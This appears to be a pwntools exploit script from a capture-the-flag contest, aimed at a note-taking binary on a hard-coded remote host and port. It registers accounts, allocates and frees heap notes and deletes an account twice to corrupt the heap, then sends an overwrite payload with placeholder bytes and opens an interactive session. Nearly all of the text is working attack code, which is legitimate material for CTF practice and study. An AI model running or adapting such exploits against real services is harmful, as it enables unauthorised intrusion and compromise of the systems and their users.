#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./mc5.elf --host 109.233.56.90 --port 11729
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("../deploy/source/notesss")

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "212.193.61.73"
port = int(args.PORT or 1338)


def local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(["edb", "--run", exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(["qira", exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()


def register(login, mail, passwd):
    io.sendlineafter(b"your choice? ",b"2")
    io.sendlineafter(b"Username: ",login)
    io.sendlineafter(b"Mail: ",mail)
    io.sendlineafter(b"Password: ",passwd)
    io.sendlineafter(b"Repeat password: ",passwd)

def login(login, passwd, mail):
    io.sendlineafter(b"your choice? ",b"1")
    io.sendlineafter(b"Username: ",login)
    io.sendlineafter(b"Password: ",passwd)
    io.sendlineafter(b"Mail: ",mail)

def add_note(size):
    io.sendlineafter(b"your choice? ",b"2")
    io.sendlineafter(b"Your new note: ",cyclic(size))


register(b"qwe", b"qwe@qwe", passwd=b"qwe")
login(b"qwe", passwd=b"qwe", mail=b"qwe@qwe")
for i in range(9):
    add_note(104)

for i in range(7):
    io.sendlineafter(b"your choice? ",b"3")
    io.sendlineafter(b"delete: ",f"{9-i}")

io.sendlineafter(b"your choice? ",b"6") # delete accaunt
io.sendlineafter(b"your choice? ",b"3") 
io.sendlineafter(b"delete: ",b"2") # delete note
io.sendlineafter(b"your choice? ",b"6") # delete accaunt again)
for i in range(7):
    add_note(104)

io.sendlineafter(b"your choice? ",b"5")

register(b"zxc", b"zxc@zxc", passwd=b"zxc")
login(b"zxc", b"zxc", mail=b"zxc@zxc")

add_note(104)
io.sendlineafter(b"your choice? ",b"2")
io.recvuntil(b"Your new note: ")
io.sendline(cyclic(96) + b"\xef\xbe\xad\xde\x99\x99\x99\x99")

io.interactive()
